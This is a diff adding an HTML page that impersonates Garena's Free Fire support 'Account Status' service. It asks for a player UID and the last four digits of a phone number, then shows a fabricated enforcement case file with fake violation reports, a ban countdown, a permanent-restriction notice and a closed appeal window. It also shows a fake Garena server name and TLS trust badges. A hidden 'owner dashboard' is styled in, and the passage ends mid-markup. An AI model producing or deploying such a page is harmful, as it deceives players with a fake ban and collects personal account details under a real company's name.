@@ -1,0 +1,1981 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+<meta name="theme-color" content="#ffffff" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<title>Account Status · Free Fire Support</title>
+
+<style>
+/* ══════════════════════════════════════════════════════════════
+   1. DESIGN TOKENS
+   ══════════════════════════════════════════════════════════════ */
+:root {
+  --bg:              #f5f6f8;
+  --surface:         #ffffff;
+  --surface-2:       #fafbfc;
+  --surface-3:       #f0f2f5;
+  --border:          #e1e4e8;
+  --border-strong:   #d0d7de;
+  --text:            #1a1a1a;
+  --text-dim:        #57606a;
+  --text-muted:      #8c959f;
+  --primary:         #f0483e;
+  --primary-hi:      #d63a30;
+  --primary-bg:      #fff5f4;
+  --link:            #0969da;
+  --amber:           #9a6700;
+  --amber-bg:        #fff8c5;
+  --amber-border:    #e2c541;
+  --blue:            #0969da;
+  --blue-bg:         #ddf4ff;
+  --blue-border:     #80ccff;
+  --red:             #cf222e;
+  --red-bg:          #ffebe9;
+  --red-border:      #ff8182;
+  --green:           #1a7f37;
+  --green-bg:        #dafbe1;
+  --green-border:    #6fdd8b;
+  --radius:          8px;
+  --radius-sm:       6px;
+  --radius-lg:       12px;
+  --shadow-sm:       0 1px 3px rgba(27,31,36,0.06);
+  --shadow:          0 1px 4px rgba(27,31,36,0.08), 0 4px 12px rgba(27,31,36,0.04);
+  --shadow-lg:       0 8px 24px rgba(27,31,36,0.14);
+  --font:            -apple-system, BlinkMacSystemFont, "Segoe UI", "Inter", Roboto, Helvetica, Arial, sans-serif;
+  --mono:            ui-monospace, "SF Mono", "JetBrains Mono", Menlo, Consolas, monospace;
+  --safe-t:          env(safe-area-inset-top, 0px);
+  --safe-b:          env(safe-area-inset-bottom, 0px);
+}
+
+*, *::before, *::after {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  -webkit-tap-highlight-color: transparent;
+}
+
+html { -webkit-text-size-adjust: 100%; }
+
+body {
+  font-family: var(--font);
+  font-size: 14px;
+  line-height: 1.55;
+  color: var(--text);
+  background: var(--bg);
+  min-height: 100vh;
+  min-height: 100dvh;
+  display: flex;
+  flex-direction: column;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+}
+
+a { color: var(--link); text-decoration: none; cursor: pointer; }
+a:hover { text-decoration: underline; }
+
+button { font-family: inherit; cursor: pointer; }
+input, select { font-family: inherit; }
+
+/* ══════════════════════════════════════════════════════════════
+   2. TOP NAVIGATION
+   ══════════════════════════════════════════════════════════════ */
+.topnav {
+  position: sticky;
+  top: 0;
+  z-index: 50;
+  background: #fff;
+  border-bottom: 1px solid var(--border);
+  box-shadow: var(--shadow-sm);
+}
+
+.topnav-inner {
+  max-width: 1180px;
+  margin: 0 auto;
+  display: flex;
+  align-items: center;
+  gap: 20px;
+  height: 60px;
+  padding: 0 20px;
+}
+
+.brand {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  flex-shrink: 0;
+  color: inherit;
+  text-decoration: none;
+}
+.brand:hover { text-decoration: none; }
+
+.brand-logo {
+  width: 32px;
+  height: 32px;
+  flex-shrink: 0;
+  border-radius: 8px;
+  background: linear-gradient(145deg, #ff5a4f 0%, #c92b23 100%);
+  display: grid;
+  place-items: center;
+  font-weight: 800;
+  font-size: 17px;
+  color: #fff;
+  box-shadow: 0 2px 6px rgba(240, 72, 62, 0.32);
+  letter-spacing: -0.5px;
+}
+
+.brand-name {
+  font-size: 15px;
+  font-weight: 700;
+  color: var(--text);
+  letter-spacing: -0.2px;
+}
+
+.brand-divider {
+  width: 1px;
+  height: 18px;
+  background: var(--border-strong);
+  margin: 0 2px;
+}
+
+.brand-product {
+  font-size: 13px;
+  font-weight: 500;
+  color: var(--text-dim);
+  letter-spacing: -0.1px;
+}
+
+.topnav-links {
+  display: flex;
+  gap: 4px;
+  margin-left: 12px;
+}
+.topnav-links a {
+  padding: 8px 12px;
+  border-radius: var(--radius-sm);
+  font-size: 13.5px;
+  color: var(--text-dim);
+  font-weight: 500;
+  text-decoration: none;
+}
+.topnav-links a:hover {
+  background: var(--surface-3);
+  color: var(--text);
+  text-decoration: none;
+}
+.topnav-links a.active {
+  color: var(--text);
+  font-weight: 600;
+}
+
+.topnav-right {
+  margin-left: auto;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.lang-select {
+  padding: 6px 26px 6px 10px;
+  border: 1px solid var(--border);
+  border-radius: var(--radius-sm);
+  background: var(--surface)
+    url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='10' height='10' viewBox='0 0 10 10'><path d='M1 3l4 4 4-4' stroke='%2357606a' stroke-width='1.5' fill='none' stroke-linecap='round'/></svg>")
+    no-repeat right 8px center;
+  font-size: 12.5px;
+  color: var(--text-dim);
+  cursor: pointer;
+  -webkit-appearance: none;
+  appearance: none;
+}
+
+.signin-btn {
+  padding: 7px 14px;
+  border: 1px solid var(--border-strong);
+  border-radius: var(--radius-sm);
+  background: #fff;
+  font-size: 13px;
+  font-weight: 500;
+  color: var(--text);
+  text-decoration: none;
+  cursor: pointer;
+  font-family: inherit;
+}
+.signin-btn:hover {
+  background: var(--surface-2);
+  text-decoration: none;
+}
+.signin-btn.owner-active {
+  color: var(--green);
+  border-color: var(--green-border);
+  background: var(--green-bg);
+  font-weight: 600;
+}
+
+/* ══════════════════════════════════════════════════════════════
+   3. MAIN LAYOUT
+   ══════════════════════════════════════════════════════════════ */
+main {
+  flex: 1;
+  padding: 22px 20px 40px;
+}
+
+.container {
+  max-width: 780px;
+  margin: 0 auto;
+  width: 100%;
+}
+
+.breadcrumb {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 12.5px;
+  color: var(--text-muted);
+  margin-bottom: 18px;
+  flex-wrap: wrap;
+}
+.breadcrumb a {
+  color: var(--text-dim);
+  text-decoration: none;
+}
+.breadcrumb a:hover { color: var(--link); }
+.breadcrumb .sep { color: var(--text-muted); opacity: 0.7; }
+.breadcrumb .current { color: var(--text); }
+
+/* ══════════════════════════════════════════════════════════════
+   4. HERO / PAGE HEADER
+   ══════════════════════════════════════════════════════════════ */
+.page-header {
+  margin-bottom: 20px;
+}
+
+.page-title {
+  font-size: 24px;
+  font-weight: 700;
+  letter-spacing: -0.4px;
+  color: var(--text);
+  margin-bottom: 6px;
+}
+
+.page-desc {
+  font-size: 13.5px;
+  color: var(--text-dim);
+  line-height: 1.55;
+  max-width: 640px;
+}
+
+/* ══════════════════════════════════════════════════════════════
+   5. PANELS / CARDS
+   ══════════════════════════════════════════════════════════════ */
+.panel {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  box-shadow: var(--shadow-sm);
+  overflow: hidden;
+}
+.panel + .panel { margin-top: 16px; }
+
+.panel-body {
+  padding: 20px 22px;
+}
+
+.panel-header {
+  padding: 14px 22px;
+  border-bottom: 1px solid var(--border);
+  background: var(--surface-2);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 12px;
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--text);
+}
+
+.panel-header .meta {
+  font-size: 11.5px;
+  color: var(--text-muted);
+  font-weight: 400;
+}
+
+/* ══════════════════════════════════════════════════════════════
+   6. FORM ELEMENTS
+   ══════════════════════════════════════════════════════════════ */
+.field { margin-bottom: 16px; }
+
+.field-label {
+  display: block;
+  font-size: 12.5px;
+  font-weight: 600;
+  color: var(--text);
+  margin-bottom: 6px;
+  letter-spacing: -0.05px;
+}
+
+.field-hint {
+  font-size: 11.5px;
+  color: var(--text-muted);
+  margin-top: 5px;
+  line-height: 1.4;
+}
+
+.input {
+  width: 100%;
+  padding: 10px 12px;
+  border: 1px solid var(--border-strong);
+  border-radius: var(--radius-sm);
+  background: #fff;
+  color: var(--text);
+  font-size: 15px;
+  outline: none;
+  transition: border-color 0.15s, box-shadow 0.15s;
+  -webkit-appearance: none;
+  appearance: none;
+}
+.input::placeholder { color: var(--text-muted); }
+.input:focus {
+  border-color: var(--link);
+  box-shadow: 0 0 0 3px rgba(9, 105, 218, 0.15);
+}
+.input.mono {
+  font-family: var(--mono);
+  letter-spacing: 2px;
+  font-size: 15px;
+}
+.input.error {
+  border-color: var(--red);
+  box-shadow: 0 0 0 3px rgba(207, 34, 46, 0.14);
+  animation: shake 0.3s;
+}
+@keyframes shake {
+  0%,100% { transform: translateX(0); }
+  25%     { transform: translateX(-5px); }
+  75%     { transform: translateX(5px); }
+}
+
+.uid-preview {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 12px;
+  padding: 11px 14px;
+  background: var(--surface-2);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-sm);
+  margin-bottom: 20px;
+  font-size: 12.5px;
+  color: var(--text-dim);
+}
+.uid-preview strong {
+  font-family: var(--mono);
+  color: var(--text);
+  font-weight: 600;
+  letter-spacing: 1px;
+}
+
+/* ══════════════════════════════════════════════════════════════
+   7. BUTTONS
+   ══════════════════════════════════════════════════════════════ */
+.btn {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  padding: 10px 16px;
+  font-size: 13.5px;
+  font-weight: 600;
+  border-radius: var(--radius-sm);
+  border: 1px solid transparent;
+  transition: background 0.15s, border-color 0.15s, transform 0.08s;
+  letter-spacing: -0.05px;
+}
+.btn:active { transform: scale(0.99); }
+.btn:disabled { opacity: 0.55; cursor: not-allowed; transform: none; }
+
+.btn-primary {
+  background: var(--primary);
+  color: #fff;
+  border-color: var(--primary-hi);
+  box-shadow: 0 1px 2px rgba(240, 72, 62, 0.15);
+}
+.btn-primary:hover { background: var(--primary-hi); }
+
+.btn-default {
+  background: #fff;
+  color: var(--text);
+  border-color: var(--border-strong);
+}
+.btn-default:hover { background: var(--surface-2); }
+
+.btn-danger {
+  background: #fff;
+  color: var(--red);
+  border-color: var(--red-border);
+}
+.btn-danger:hover { background: var(--red-bg); }
+
+.btn-block { width: 100%; }
+
+.actions-row {
+  display: flex;
+  gap: 10px;
+  margin-top: 4px;
+}
+.actions-row .btn { flex: 1; }
+
+/* ══════════════════════════════════════════════════════════════
+   8. TRUST STRIP
+   ══════════════════════════════════════════════════════════════ */
+.trust-strip {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 14px;
+  padding: 12px 16px;
+  margin-top: 16px;
+  background: var(--surface-2);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-sm);
+  font-size: 11.5px;
+  color: var(--text-muted);
+}
+.trust-strip span {
+  display: inline-flex;
+  align-items: center;
+  gap: 5px;
+}
+.trust-strip svg { width: 12px; height: 12px; flex-shrink: 0; }
+
+/* ══════════════════════════════════════════════════════════════
+   9. STEP PROGRESS
+   ══════════════════════════════════════════════════════════════ */
+.step-progress {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  margin-bottom: 22px;
+  font-size: 12px;
+  color: var(--text-muted);
+  overflow-x: auto;
+  padding-bottom: 2px;
+  scrollbar-width: none;
+}
+.step-progress::-webkit-scrollbar { display: none; }
+
+.step-progress .step-item {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  padding: 5px 10px;
+  border-radius: 999px;
+  border: 1px solid var(--border);
+  background: #fff;
+  white-space: nowrap;
+  flex-shrink: 0;
+}
+.step-progress .step-item.active {
+  border-color: var(--link);
+  color: var(--link);
+  background: var(--blue-bg);
+  font-weight: 600;
+}
+.step-progress .step-item.done {
+  border-color: var(--green-border);
+  background: var(--green-bg);
+  color: var(--green);
+}
+.step-progress .step-num {
+  width: 16px;
+  height: 16px;
+  border-radius: 50%;
+  display: grid;
+  place-items: center;
+  font-size: 10px;
+  font-weight: 700;
+  background: currentColor;
+  color: #fff;
+}
+.step-progress .step-item.done .step-num::before { content: "✓"; }
+.step-progress .step-item:not(.done) .step-num::before { content: attr(data-n); }
+
+/* ══════════════════════════════════════════════════════════════
+   10. PROCESSING SPINNER
+   ══════════════════════════════════════════════════════════════ */
+.processing {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 44px 20px;
+  text-align: center;
+}
+.spinner {
+  width: 34px;
+  height: 34px;
+  border-radius: 50%;
+  border: 3px solid var(--border);
+  border-top-color: var(--primary);
+  animation: spin 0.85s linear infinite;
+  margin-bottom: 18px;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.processing-title {
+  font-size: 15px;
+  font-weight: 600;
+  color: var(--text);
+  margin-bottom: 4px;
+}
+.processing-desc {
+  font-size: 12.5px;
+  color: var(--text-dim);
+}
+
+/* ══════════════════════════════════════════════════════════════
+   11. CASE FILE
+   ══════════════════════════════════════════════════════════════ */
+.case-header {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  box-shadow: var(--shadow-sm);
+  margin-bottom: 16px;
+  overflow: hidden;
+}
+
+.case-title-bar {
+  display: flex;
+  align-items: flex-start;
+  justify-content: space-between;
+  gap: 14px;
+  padding: 20px 22px 16px;
+  border-bottom: 1px solid var(--border);
+}
+
+.case-title {
+  font-size: 18px;
+  font-weight: 700;
+  letter-spacing: -0.3px;
+  color: var(--text);
+  line-height: 1.25;
+  margin-bottom: 3px;
+}
+
+.case-subtitle {
+  font-size: 12.5px;
+  color: var(--text-muted);
+  font-family: var(--mono);
+  letter-spacing: 0.2px;
+}
+
+.status-pill {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  padding: 5px 11px;
+  border-radius: 999px;
+  font-size: 11.5px;
+  font-weight: 650;
+  letter-spacing: 0.2px;
+  white-space: nowrap;
+  flex-shrink: 0;
+  border: 1px solid;
+}
+.status-pill::before {
+  content: "";
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  background: currentColor;
+  animation: pillPulse 1.4s ease-in-out infinite;
+}
+@keyframes pillPulse {
+  0%, 100% { opacity: 1; transform: scale(1); }
+  50%      { opacity: 0.4; transform: scale(0.8); }
+}
+.status-pill.amber { color: var(--amber); background: var(--amber-bg); border-color: var(--amber-border); }
+.status-pill.blue  { color: var(--blue);  background: var(--blue-bg);  border-color: var(--blue-border); }
+.status-pill.red   { color: var(--red);   background: var(--red-bg);   border-color: var(--red-border); }
+
+.meta-grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 1px;
+  background: var(--border);
+}
+.meta-cell {
+  background: var(--surface);
+  padding: 12px 22px;
+}
+.meta-cell .k {
+  display: block;
+  font-size: 11px;
+  color: var(--text-muted);
+  font-weight: 600;
+  letter-spacing: 0.4px;
+  text-transform: uppercase;
+  margin-bottom: 3px;
+}
+.meta-cell .v {
+  display: block;
+  font-family: var(--mono);
+  font-size: 13px;
+  color: var(--text);
+  font-weight: 600;
+  word-break: break-all;
+}
+
+.eta-panel {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  box-shadow: var(--shadow-sm);
+  margin-bottom: 16px;
+  overflow: hidden;
+}
+
+.eta-body { padding: 20px 22px; }
+
+.eta-label {
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: 0.6px;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  margin-bottom: 10px;
+}
+
+.eta-value {
+  font-family: var(--mono);
+  font-size: 32px;
+  font-weight: 700;
+  color: var(--text);
+  letter-spacing: 1px;
+  line-height: 1;
+  font-variant-numeric: tabular-nums;
+  margin-bottom: 12px;
+}
+.eta-value .colon { opacity: 0.4; font-weight: 500; }
+.eta-value.waiting {
+  font-family: var(--font);
+  font-size: 14px;
+  letter-spacing: 0;
+  font-weight: 500;
+  color: var(--amber);
+  font-variant-numeric: normal;
+}
+
+.phase-desc {
+  font-size: 13px;
+  color: var(--text-dim);
+  line-height: 1.55;
+  padding-top: 12px;
+  border-top: 1px dashed var(--border);
+}
+
+.evidence-list {
+  max-height: 380px;
+  overflow-y: auto;
+}
+.evidence-list::-webkit-scrollbar { width: 8px; }
+.evidence-list::-webkit-scrollbar-track { background: var(--surface-2); }
+.evidence-list::-webkit-scrollbar-thumb { background: var(--border-strong); border-radius: 4px; }
+
+.report-row {
+  display: grid;
+  grid-template-columns: 1fr auto;
+  gap: 12px;
+  padding: 13px 22px;
+  border-bottom: 1px solid var(--border);
+  font-size: 12.5px;
+}
+.report-row:last-child { border-bottom: none; }
+
+.report-main { min-width: 0; }
+.report-id {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--text);
+  font-weight: 600;
+  letter-spacing: 0.3px;
+  margin-bottom: 2px;
+}
+.report-meta {
+  font-size: 11.5px;
+  color: var(--text-muted);
+  display: flex;
+  flex-wrap: wrap;
+  gap: 6px;
+}
+.report-meta .dot { opacity: 0.5; }
+
+.report-cat {
+  font-size: 11px;
+  font-weight: 600;
+  padding: 3px 8px;
+  border-radius: 4px;
+  background: var(--red-bg);
+  color: var(--red);
+  align-self: flex-start;
+  border: 1px solid var(--red-border);
+  white-space: nowrap;
+}
+
+.case-actions {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px;
+  margin-top: 16px;
+}
+.action-link {
+  padding: 8px 14px;
+  border-radius: var(--radius-sm);
+  border: 1px solid var(--border-strong);
+  background: #fff;
+  font-size: 12.5px;
+  color: var(--text);
+  font-weight: 500;
+  text-decoration: none;
+}
+.action-link:hover {
+  background: var(--surface-2);
+  text-decoration: none;
+}
+
+/* ══════════════════════════════════════════════════════════════
+   12. BANNED NOTICE
+   ══════════════════════════════════════════════════════════════ */
+.banned-notice {
+  padding: 18px 22px;
+  background: var(--red-bg);
+  border: 1px solid var(--red-border);
+  border-radius: var(--radius-lg);
+  margin-bottom: 16px;
+  display: flex;
+  gap: 14px;
+  align-items: flex-start;
+}
+.banned-notice svg {
+  width: 22px;
+  height: 22px;
+  flex-shrink: 0;
+  color: var(--red);
+  margin-top: 1px;
+}
+.banned-notice h3 {
+  font-size: 14px;
+  font-weight: 700;
+  color: var(--red);
+  margin-bottom: 3px;
+  letter-spacing: -0.1px;
+}
+.banned-notice p {
+  font-size: 12.5px;
+  color: var(--text-dim);
+  line-height: 1.5;
+}
+
+/* ══════════════════════════════════════════════════════════════
+   13. FOOTER
+   ══════════════════════════════════════════════════════════════ */
+.footer {
+  background: #fff;
+  border-top: 1px solid var(--border);
+  padding: 24px 20px calc(20px + var(--safe-b));
+  font-size: 12px;
+  color: var(--text-dim);
+}
+
+.footer-inner {
+  max-width: 1180px;
+  margin: 0 auto;
+}
+
+.footer-links {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 18px;
+  margin-bottom: 14px;
+}
+.footer-links a {
+  color: var(--text-dim);
+  font-size: 12px;
+}
+.footer-links a:hover { color: var(--link); }
+
+.footer-bottom {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 12px;
+  justify-content: space-between;
+  padding-top: 14px;
+  border-top: 1px solid var(--border);
+  font-size: 11px;
+  color: var(--text-muted);
+}
+
+#footerCopyright {
+  cursor: default;
+  user-select: none;
+}
+
+/* ══════════════════════════════════════════════════════════════
+   14. MODALS
+   ══════════════════════════════════════════════════════════════ */
+.modal {
+  position: fixed;
+  inset: 0;
+  z-index: 200;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  background: rgba(27, 31, 36, 0.55);
+  backdrop-filter: blur(2px);
+  -webkit-backdrop-filter: blur(2px);
+  animation: fadeIn 0.15s ease;
+}
+.modal.active { display: flex; }
+@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+.modal-card {
+  width: 100%;
+  max-width: 420px;
+  background: #fff;
+  border-radius: var(--radius-lg);
+  box-shadow: var(--shadow-lg);
+  padding: 24px 22px;
+  animation: modalIn 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+  max-height: 90vh;
+  overflow-y: auto;
+}
+@keyframes modalIn {
+  from { opacity: 0; transform: scale(0.96) translateY(8px); }
+  to   { opacity: 1; transform: scale(1) translateY(0); }
+}
+
+.modal-card h2 {
+  font-size: 17px;
+  font-weight: 700;
+  color: var(--text);
+  margin-bottom: 6px;
+  letter-spacing: -0.2px;
+}
+.modal-card p {
+  font-size: 13px;
+  color: var(--text-dim);
+  line-height: 1.55;
+  margin-bottom: 18px;
+}
+.modal-card .field { margin-bottom: 14px; }
+.modal-card .btn { margin-bottom: 8px; }
+.modal-card .btn:last-child { margin-bottom: 0; }
+
+.modal-status {
+  min-height: 18px;
+  margin-top: 12px;
+  font-size: 12px;
+  text-align: center;
+  color: var(--text-dim);
+}
+.modal-status.err { color: var(--red); }
+.modal-status.ok  { color: var(--green); }
+
+/* ══════════════════════════════════════════════════════════════
+   15. OWNER DASHBOARD
+   ══════════════════════════════════════════════════════════════ */
+.owner-card { max-width: 480px; }
+
+.owner-pill {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  padding: 4px 10px;
+  border-radius: 999px;
+  font-size: 11px;
+  font-weight: 650;
+  letter-spacing: 0.2px;
+  color: var(--green);
+  background: var(--green-bg);
+  border: 1px solid var(--green-border);
+  margin-bottom: 14px;
+}
+
+.owner-info {
+  background: var(--surface-2);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-sm);
+  padding: 4px 14px;
+  margin-bottom: 18px;
+}
+.owner-row {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  gap: 12px;
+  padding: 10px 0;
+  font-size: 12.5px;
+}
+.owner-row + .owner-row { border-top: 1px solid var(--border); }
+.owner-row .k { color: var(--text-dim); }
+.owner-row .v {
+  font-family: var(--mono);
+  font-weight: 600;
+  color: var(--text);
+  font-size: 12.5px;
+}
+.owner-row .v.ok      { color: var(--green); }
+.owner-row .v.idle    { color: var(--amber); }
+.owner-row .v.expired { color: var(--red); }
+
+/* ══════════════════════════════════════════════════════════════
+   16. UTILITIES / RESPONSIVE
+   ══════════════════════════════════════════════════════════════ */
+.hidden { display: none !important; }
+
+@media (max-width: 640px) {
+  .topnav-inner { padding: 0 14px; gap: 12px; }
+  .topnav-links { display: none; }
+  .brand-product { display: none; }
+  .brand-divider { display: none; }
+  .page-title { font-size: 20px; }
+  .eta-value { font-size: 26px; }
+  .case-title-bar { padding: 16px 18px 14px; flex-wrap: wrap; }
+  .panel-body { padding: 18px; }
+  .meta-cell { padding: 10px 18px; }
+  .panel-header { padding: 12px 18px; }
+  .report-row { padding: 12px 18px; }
+  .banned-notice { padding: 16px 18px; }
+  .footer-links { gap: 14px; }
+}
+
+@media (max-width: 380px) {
+  .eta-value { font-size: 22px; letter-spacing: 0.5px; }
+  .meta-grid { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+
+<body>
+
+<!-- ═══════════════ HEADER ═══════════════ -->
+<header class="topnav">
+  <div class="topnav-inner">
+    <a class="brand" href="#">
+      <div class="brand-logo">G</div>
+      <span class="brand-name">Garena</span>
+      <span class="brand-divider"></span>
+      <span class="brand-product">Free Fire Support</span>
+    </a>
+
+    <nav class="topnav-links">
+      <a href="#">Home</a>
+      <a href="#">Support</a>
+      <a href="#" class="active">Account Status</a>
+      <a href="#">Community</a>
+    </nav>
+
+    <div class="topnav-right">
+      <select class="lang-select" aria-label="Language">
+        <option>English</option>
+        <option>हिन्दी</option>
+        <option>Bahasa</option>
+        <option>Español</option>
+      </select>
+      <button class="signin-btn" id="signinBtn" type="button">Sign In</button>
+    </div>
+  </div>
+</header>
+
+<!-- ═══════════════ MAIN ═══════════════ -->
+<main>
+  <div class="container">
+
+    <div class="breadcrumb">
+      <a href="#">Home</a>
+      <span class="sep">/</span>
+      <a href="#">Support</a>
+      <span class="sep">/</span>
+      <span class="current" id="breadcrumbCurrent">Account Status</span>
+    </div>
+
+    <div class="step-progress" id="stepProgress">
+      <div class="step-item active" id="progUid" data-step="1">
+        <span class="step-num" data-n="1"></span>
+        <span>Enter UID</span>
+      </div>
+      <div class="step-item" id="progVerify" data-step="2">
+        <span class="step-num" data-n="2"></span>
+        <span>Verify Account</span>
+      </div>
+      <div class="step-item" id="progCase" data-step="3">
+        <span class="step-num" data-n="3"></span>
+        <span>View Case File</span>
+      </div>
+    </div>
+
+    <!-- STEP 1 -->
+    <section class="step-screen" id="stepUid">
+      <div class="page-header">
+        <h1 class="page-title">Account Status Lookup</h1>
+        <p class="page-desc">
+          Enter your player UID to view the current status of your Free Fire
+          account, including any pending enforcement actions or reviews.
+        </p>
+      </div>
+
+      <div class="panel">
+        <div class="panel-body">
+          <div class="field">
+            <label class="field-label" for="uidInput">Player UID</label>
+            <input
+              type="tel"
+              id="uidInput"
+              class="input mono"
+              placeholder="Enter your numeric UID"
+              maxlength="12"
+              inputmode="numeric"
+              autocomplete="off"
+              spellcheck="false"
+            />
+            <div class="field-hint">8–12 digit numeric player ID found in your Free Fire profile</div>
+          </div>
+
+          <button class="btn btn-primary btn-block" id="btnToVerify">Continue</button>
+        </div>
+      </div>
+
+      <div class="trust-strip">
+        <span>
+          <svg viewBox="0 0 16 16" fill="currentColor"><path d="M8 1a3.5 3.5 0 0 0-3.5 3.5V6H4a1 1 0 0 0-1 1v6a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V7a1 1 0 0 0-1-1h-.5V4.5A3.5 3.5 0 0 0 8 1Zm2 5V4.5a2 2 0 1 0-4 0V6h4Z"/></svg>
+          Secured connection · TLS 1.3
+        </span>
+        <span>Server: in-enforcement-02.garena.com</span>
+        <span>Region: IN</span>
+      </div>
+    </section>
+
+    <!-- STEP 2 -->
+    <section class="step-screen hidden" id="stepVerify">
+      <div class="page-header">
+        <h1 class="page-title">Verify Account Ownership</h1>
+        <p class="page-desc">
+          For your security, please verify you own this account before we
+          display any status information.
+        </p>
+      </div>
+
+      <div class="panel">
+        <div class="panel-body">
+          <div class="uid-preview">
+            <span>Player UID</span>
+            <strong id="verifyUidDisplay">—</strong>
+          </div>
+
+          <div class="field">
+            <label class="field-label" for="verifyInput">Last 4 digits of linked phone number</label>
+            <input
+              type="tel"
+              id="verifyInput"
+              class="input mono"
+              placeholder="••••"
+              maxlength="4"
+              inputmode="numeric"
+              autocomplete="off"
+              spellcheck="false"
+            />
+            <div class="field-hint">Enter the last 4 digits of the phone number currently linked to this account</div>
+          </div>
+
+          <button class="btn btn-primary btn-block" id="btnVerify">Verify and Continue</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- STEP 3 -->
+    <section class="step-screen hidden" id="stepCase">
+
+      <div class="case-header">
+        <div class="case-title-bar">
+          <div>
+            <h1 class="case-title" id="caseTitle">Incident Report</h1>
+            <div class="case-subtitle" id="caseIdDisplay">CASE-FF-IN-2025-000000</div>
+          </div>
+          <span class="status-pill amber" id="caseStatusPill">Under Review</span>
+        </div>
+
+        <div class="meta-grid">
+          <div class="meta-cell">
+            <span class="k">Player UID</span>
+            <span class="v" id="metaUid">—</span>
+          </div>
+          <div class="meta-cell">
+            <span class="k">Submitted</span>
+            <span class="v" id="metaSubmitted">—</span>
+          </div>
+          <div class="meta-cell">
+            <span class="k">Reviewer</span>
+            <span class="v" id="metaReviewer">Enforcement Team</span>
+          </div>
+          <div class="meta-cell">
+            <span class="k">Region</span>
+            <span class="v" id="metaRegion">India (IN)</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="banned-notice hidden" id="bannedNotice">
+        <svg viewBox="0 0 16 16" fill="currentColor"><path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0ZM5.5 4.5 8 7l2.5-2.5L11.5 5.5 9 8l2.5 2.5-1 1L8 9l-2.5 2.5-1-1L7 8 4.5 5.5l1-1Z"/></svg>
+        <div>
+          <h3>Account Permanently Restricted</h3>
+          <p id="bannedReasonText">This account has been permanently restricted following review of multiple confirmed violation reports. The decision is final and the appeal window has closed.</p>
+        </div>
+      </div>
+
+      <div class="eta-panel">
+        <div class="panel-header">
+          <span id="etaHeaderLabel">Review ETA</span>
+          <span class="meta" id="lastSynced">Last synced just now</span>
+        </div>
+        <div class="eta-body">
+          <div class="eta-label" id="etaLabel">Decision Scheduled In</div>
+          <div class="eta-value waiting" id="etaValue">Connecting to server…</div>
+          <div class="phase-desc" id="phaseDesc">Fetching case status…</div>
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-header">
+          <span>Attached Evidence</span>
+          <span class="meta" id="evidenceCount">0 reports</span>
+        </div>
+        <div class="evidence-list" id="evidenceList"></div>
+      </div>
+
+      <div class="case-actions">
+        <a class="action-link" id="policyLink">View Anti-Cheat Policy</a>
+        <a class="action-link" id="appealLink">Submit Appeal</a>
+      </div>
+    </section>
+
+  </div>
+</main>
+
+<!-- ═══════════════ FOOTER ═══════════════ -->
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-links">
+      <a href="#">Terms of Service</a>
+      <a href="#">Privacy Policy</a>
+      <a href="#">Anti-Cheat Policy</a>
+      <a href="#">Community Guidelines</a>
+      <a href="#">Contact Support</a>
+      <a href="#">Report a Player</a>
+    </div>
+    <div class="footer-bottom">
+      <span id="footerCopyright">© 2025 Garena International I Pte. Ltd. All rights reserved.</span>
+      <span>v4.2.1 · in-enforcement-02</span>
+    </div>
+  </div>
+</footer>
+
+<!-- ═══════════════ MODALS ═══════════════ -->
+
+<div class="modal" id="appealModal">
+  <div class="modal-card">
+    <h2 id="appealTitle">Appeal Window Closed</h2>
+    <p id="appealBody">
+      The appeal window for this case has closed. Enforcement decisions are
+      final after the review period has ended.
+    </p>
+    <button class="btn btn-default btn-block" data-close="appealModal">Close</button>
+  </div>
+</div>
+
+<div class="modal" id="policyModal">
+  <div class="modal-card">
+    <h2>Anti-Cheat Policy</h2>
+    <p style="margin-bottom:14px;">
+      Our enforcement system monitors accounts for violations of the
+      Community Guidelines and Terms of Service, including but not limited to:
+    </p>
